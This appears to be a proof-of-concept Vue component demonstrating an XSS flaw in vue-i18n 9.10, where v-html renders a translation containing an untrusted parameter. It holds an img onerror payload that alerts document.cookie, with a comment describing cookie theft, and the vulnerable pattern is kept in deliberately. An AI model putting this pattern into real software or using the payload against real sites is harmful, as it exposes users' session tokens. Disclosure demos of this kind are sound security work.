<template>
  <div>
    <h2>XSS Demo</h2>
    <div v-html="$t('welcome', { name })"></div>
    <p>
      This demonstrates an XSS vulnerability in vue-i18n@9.10 when using
      <code>v-html</code> with untrusted translations and parameters that could
      come from external sources (e.g., an API response).
    </p>
    <p>
      <strong>Example:</strong> If <code>name</code> is set to
      <code>&lt;img src=x onerror=alert('XSS')&gt;</code> by an API, the XSS
      will trigger.
    </p>
  </div>
</template>

<script setup>
// In a real app, this value could come from an external API
// This payload will read the secure token cookie and send it to an attacker (here, just alert for demo)
const name = `<img src=x onerror=alert(document.cookie)>`;
</script>
